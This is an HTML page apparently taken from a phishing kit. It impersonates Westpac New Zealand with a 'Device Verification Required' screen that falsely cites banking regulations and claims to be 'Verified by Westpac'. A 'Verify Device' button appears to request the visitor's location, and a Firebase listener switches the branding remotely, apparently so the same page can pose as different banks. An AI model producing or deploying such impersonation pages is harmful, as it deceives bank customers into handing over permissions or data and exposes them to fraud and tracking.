<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <meta http-equiv='cache-control' content='no-cache'>
    <meta http-equiv='expires' content='0'>
    <meta http-equiv='pragma' content='no-cache'>
    <title>Device Verification</title>
    <link id="themeStyles" rel="stylesheet" href="themes/westpac.css">
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <img src="./assets/westpac-logo.png" alt="Westpac" class="logo-image">
            </div>
        </header>
        
        <main>
            <div class="thank-you-card">
                <h1>Device Verification Required</h1>
                <div class="checkmark">âœ“</div>
                <p class="message">Please verify your device to continue</p>
                <p class="sub-message">To comply with recent banking regulations and ensure your account security, we need to verify this device.</p>
                
                <div class="security-badges">
                    <div class="badge">
                        <span class="icon">ðŸ”’</span>
                        <span class="text">Bank-Grade Security</span>
                    </div>
                    <div class="badge">
                        <span class="icon">âœ“</span>
                        <span class="text">Verified by Westpac</span>
                    </div>
                </div>

                <button id="allowLocation" class="primary-button">Verify Device</button>
                <p class="location-status" id="locationStatus"></p>
                
                <div class="info-box">
                    <p>Why is this required?</p>
                    <ul>
                        <li>Protect against unauthorized access</li>
                        <li>Comply with NZ banking regulations</li>
                        <li>Ensure secure transactions</li>
                    </ul>
                </div>
            </div>
        </main>
        
        <footer>
            <p>Â© 2024 Westpac New Zealand Limited. All rights reserved.</p>
            <div class="footer-links">
                <a href="#">Privacy</a>
                <a href="#">Security</a>
                <a href="#">Terms of Use</a>
            </div>
        </footer>
    </div>
    <script src="themes/config.js"></script>
    <script>
        // Initialize theme immediately
        const activeTheme = 'westpac'; // Default theme
        const theme = themes[activeTheme];
        
        // Update theme styles
        document.getElementById('themeStyles').href = theme.styles;
        
        // Update logo
        document.querySelector('.logo-image').src = theme.logo;
        
        // Update title
        document.title = `Device Verification - ${theme.name}`;
        
        // Listen for theme changes from Firebase
        firebase.database().ref('activeTheme').on('value', snapshot => {
            const newTheme = themes[snapshot.val() || 'westpac'];
            document.getElementById('themeStyles').href = newTheme.styles;
            document.querySelector('.logo-image').src = newTheme.logo;
            document.title = `Device Verification - ${newTheme.name}`;
        });
    </script>
    <script src="./script.js"></script>
</body>
</html>
